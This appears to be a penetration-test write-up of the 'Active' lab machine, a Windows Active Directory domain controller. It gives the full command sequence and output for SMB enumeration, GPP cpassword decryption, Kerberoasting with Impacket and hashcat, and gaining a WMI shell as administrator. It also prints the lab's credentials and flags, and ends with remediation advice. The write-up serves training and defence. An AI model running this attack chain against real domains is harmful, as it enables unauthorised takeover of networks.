# Active - Vulnerability Assessment Report

**Author:** Dan Schvetz  
**Date:** 04-06-2026  
**Target IP:** 10.129.12.197  
**OS:** Windows (Active Directory)  
**Difficulty:** Easy  

---

## 1. Executive Summary

**Objective:** To perform a vulnerability assessment and network penetration test against the target machine "Active" to identify security weaknesses and evaluate the overall risk to the Active Directory environment.

**Outcome:** The Active Directory Domain Controller was successfully compromised, resulting in full Domain Administrator (`active\administrator`) access. 

**Key Findings:** The initial compromise was achieved by identifying a legacy Group Policy Preference (GPP) configuration file exposed on an anonymous SMB share, which contained a decryptable password for a service account. Privilege escalation was subsequently achieved by performing a Kerberoasting attack against the Domain Administrator account, extracting and offline-cracking its Kerberos Service Ticket.

| Risk Metric | Status |
| :--- | :--- |
| **Overall Risk Rating** | **Critical** |
| **Initial Access Vector** | Group Policy Preference (GPP) Password Leak |
| **Privilege Escalation** | Kerberoasting / Weak Passwords |

---

## 2. Methodology & Scope

* **Scope:** 10.129.12.197 (`active.htb`)
* **Methodology:**
    1.  Information Gathering & Enumeration
    2.  Vulnerability Analysis
    3.  Exploitation (Initial Access)
    4.  Post-Exploitation & Privilege Escalation
    5.  Reporting & Remediation

---

## 3. Attack Narrative (Technical Walkthrough)

### 3.1 Reconnaissance & Enumeration
*Initial network scanning and service identification.*

**Port Scanning:**
An initial TCP port scan was conducted, revealing services indicative of a Windows Active Directory Domain Controller.

```text
# nmap -sC -sV -A -Pn -p- --min-rate 1000 10.129.12.197

Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-06-04 05:25 -0400
Nmap scan report for 10.129.12.197
Host is up (0.062s latency).
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos 
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
445/tcp   open  microsoft-ds?
```
*Figure 1: Nmap scan identifies standard Domain Controller ports (DNS, Kerberos, LDAP, SMB).*

**SMB Enumeration & Verified Controls (Negative Findings):**
Unauthenticated enumeration of the SMB service (Port 445) was performed. While administrative shares (`ADMIN$`, `C$`) and standard shares (`Users`) correctly denied access, the `Replication` share was misconfigured to allow anonymous read access.

```text
# smbmap -H 10.129.12.197 -u '' -p '' 
                                                                                                                             
[+] IP: 10.129.12.197:445       Name: 10.129.12.197             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```
*Figure 2: SMBMap output detailing anonymous access controls and the exposed Replication share.*

### 3.2 Initial Access (Exploitation)
*Execution of the identified vulnerabilities to achieve a user-level foothold.*

**Vulnerability Discovery (GPP Password Leak):**
Connecting to the anonymous `Replication` share allowed for the enumeration of Active Directory Group Policy objects. A `Groups.xml` policy preference file was discovered, which contained an encrypted `cpassword` attribute for the `SVC_TGS` service account.

```text
# smbclient //10.129.12.197/Replication
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
/NglVmQ"
```
*Figure 3: Extraction of the Groups.xml file revealing the encrypted cpassword.*

**Exploitation Step-by-Step:**
1.  Microsoft previously published the static AES private key used to encrypt these `cpassword` fields. Using this known key (`gpp-decrypt`), the password was successfully decrypted to plaintext.
2.  The recovered credentials (`SVC_TGS` : `GPPstillStandingStrong2k18`) were verified via SMB, granting read access to the `Users` share to capture the user flag.

```text
# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

# smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.129.12.197/Users          
smb: \SVC_TGS\Desktop\> get user.txt
smb: \SVC_TGS\Desktop\> !cat user.txt
10b4f24facfcd96d0ec34677574d6fd5
```
*Figure 4: Decryption of the GPP password and validation of initial domain access.*

### 3.3 Privilege Escalation
*Lateral movement and elevation to administrative access.*

**Internal Enumeration:**
With a valid domain account (`SVC_TGS`), LDAP was queried to map the domain structure. Enumeration revealed that the built-in `Administrator` account was configured with a Service Principal Name (SPN) for `active/CIFS:445`. 

**The Flaw (Kerberoasting):**
Because the `Administrator` account has an SPN, any authenticated user in the domain can request a Kerberos Ticket Granting Service (TGS) ticket for that service. This ticket is encrypted using the NTLM hash of the service account's password, making it susceptible to offline brute-force attacks.

**Exploitation:**
Using Impacket's `GetUserSPNs`, the TGS ticket for the `Administrator` account was requested and extracted from the Domain Controller. 

```text
# impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.129.12.197 -request
ServicePrincipalName  Name           MemberOf                                                  
--------------------  -------------  --------------------------------------------------------  
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e1a88f26bec10b58d...
```
*Figure 5: Extraction of the encrypted TGS ticket via Kerberoasting.*

The ticket was then subjected to an offline dictionary attack using Hashcat, which successfully recovered the plaintext password (`Ticketmaster1968`) due to its low complexity. Finally, Impacket's `wmiexec` was used to authenticate via WMI, granting an interactive `SYSTEM`-level shell on the Domain Controller.

```text
# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*[...]:Ticketmaster1968
Session..........: hashcat
Status...........: Cracked

# impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.12.197
C:\>whoami
active\administrator

C:\Users\Administrator\Desktop>type root.txt
fa83425ff3b50a1945ede3fed9e74120
```
*Figure 6: Successful offline crack of the Kerberos ticket and execution of a WMI remote shell.*

---

## 4. Vulnerability Details & Remediation

### Vulnerability 1: Active Directory GPP Password Leak (CVE-2014-1812)
* **Severity:** High

**Description:**
Prior to MS14-025, Windows Server allowed administrators to set local account passwords across the domain using Group Policy Preferences (GPP). These passwords were encrypted using a static AES-256 key that Microsoft inadvertently published on MSDN. The target environment still houses legacy `Groups.xml` files in the SYSVOL `Replication` directory, allowing any user with network access to download and decrypt the credentials.

**Business Impact:**
Any unauthenticated attacker on the network can recover active domain credentials. This entirely bypasses initial authentication controls, granting the attacker a valid foothold within the internal Active Directory environment.

**Remediation:**
* **Delete Legacy Files:** Manually search the SYSVOL directory for `Groups.xml`, `Services.xml`, `Printers.xml`, `Drives.xml`, and `DataSources.xml` files containing the `cpassword` attribute and delete them.
* **Implement LAPS:** Do not use Group Policy to manage local administrator passwords. Deploy the Microsoft Local Administrator Password Solution (LAPS) to securely randomize and manage local credentials across the domain.

### Vulnerability 2: Weak Passwords & Kerberoasting Susceptibility
* **Severity:** Critical

**Description:**
The highly privileged `Administrator` account was assigned a Service Principal Name (SPN). By design, Active Directory allows any authenticated user to request a Kerberos service ticket (TGS) for any account with an SPN. Because the ticket is encrypted using the password hash of the target account, it can be cracked offline. The `Administrator` account utilized a weak password (`Ticketmaster1968`) that was easily cracked using a standard wordlist.

**Business Impact:**
A low-privileged user (or compromised service account like `SVC_TGS`) can easily escalate their privileges to Domain Administrator without triggering standard failed-login alerts, resulting in total control over the corporate domain, data, and underlying infrastructure.

**Remediation:**
* **Password Complexity:** Ensure that any account associated with an SPN utilizes a password of at least 25-30 characters, generated randomly, to mathematically defeat offline dictionary and brute-force attacks.
* **Remove Unnecessary SPNs:** Audit the environment and remove SPNs from high-privileged administrative accounts (like `Administrator`). Human user accounts should rarely require SPN mapping.
* **Implement gMSA:** Where services require domain accounts, transition to Group Managed Service Accounts (gMSA), which automatically generate and rotate complex, 120-character passwords that cannot be easily cracked.
